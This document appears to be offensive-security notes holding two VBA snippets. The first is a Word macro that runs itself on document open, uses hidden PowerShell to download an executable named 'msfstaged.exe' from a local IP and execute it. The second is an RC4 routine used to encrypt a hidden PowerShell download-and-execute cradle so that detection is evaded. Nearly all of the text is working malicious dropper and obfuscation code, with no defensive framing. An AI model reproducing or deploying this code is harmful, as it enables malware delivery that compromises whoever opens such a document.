
### Download and save to path

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.185/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim pwd As String
    pwd = GetCurrentDirectory()
    Dim exePath As String
    exePath = pwd + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

Function GetCurrentDirectory() As String
    Dim wsh As Object
    Dim cmd As String
    Dim exec As Object
    Dim output As String
    Dim cd As String
    
    Set wsh = CreateObject("WScript.Shell")
    cmd = "cmd.exe /c echo %cd%"
    Set exec = wsh.exec(cmd)
    output = exec.StdOut.ReadAll
    cd = Replace(output, vbCr, "")
    cd = Replace(cd, vbLf, "")
    
    GetCurrentDirectory = cd
    
    Set exec = Nothing
    Set wsh = Nothing
End Function

```

### RC4 Encryption example

```vb
Function RC4ByteArray(key() As Byte, data() As Byte) As Byte()
    Dim S(255) As Integer
    Dim t(255) As Integer
    Dim i As Integer, j As Integer, l As Integer
    
    Dim temp As Integer
    Dim keystream As Integer
    Dim k As Long
    Dim dataLength As Long
    Dim output() As Byte
    
    dataLength = UBound(data) - LBound(data) + 1
    ReDim output(LBound(data) To UBound(data))
    
    ' Initialize S and T
    For i = 0 To 255
        S(i) = i
        t(i) = key(i Mod (UBound(key) - LBound(key) + 1)) ' Key Scheduling
    Next i
    
    ' Initial permutation of S
    j = 0
    For i = 0 To 255
        j = (j + S(i) + t(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
    Next i
    
    ' Perform the encryption/decryption
    i = 0
    j = 0
    
    For k = LBound(data) To UBound(data)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
        l = (S(i) + S(j)) Mod 256
        keystream = S(l)
        output(k) = data(k) Xor keystream
    Next k
    
    RC4ByteArray = output
End Function

Sub TestRC4Macro()
    Dim key As String
    Dim plaintext As String
    Dim ciphertext() As Byte
    Dim decrypted() As Byte
    Dim keyBytes() As Byte
    Dim plaintextBytes() As Byte
    
    ' Example key and plaintext
    key = "mysecretkey"
    plaintext = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    
    ' Convert key and plaintext to byte arrays
    keyBytes = StrConv(key, vbFromUnicode)
    plaintextBytes = StrConv(plaintext, vbFromUnicode)
    
    ' Encrypt the plaintext
    ciphertext = RC4ByteArray(keyBytes, plaintextBytes)
    
    ' Print ciphertext as hex string
    Dim i As Integer
    Dim hexStr As String
    For i = LBound(ciphertext) To UBound(ciphertext)
        hexStr = hexStr & Right("00" & Hex(ciphertext(i)), 2)
    Next i
    Debug.Print "Ciphertext (hex): " & hexStr
    
    ' Decrypt the ciphertext
    decrypted = RC4ByteArray(keyBytes, ciphertext)
    
    ' Convert decrypted byte array back to string
    Dim decryptedText As String
    decryptedText = StrConv(decrypted, vbUnicode)
    
    Debug.Print "Decrypted: " & decryptedText

End Sub

```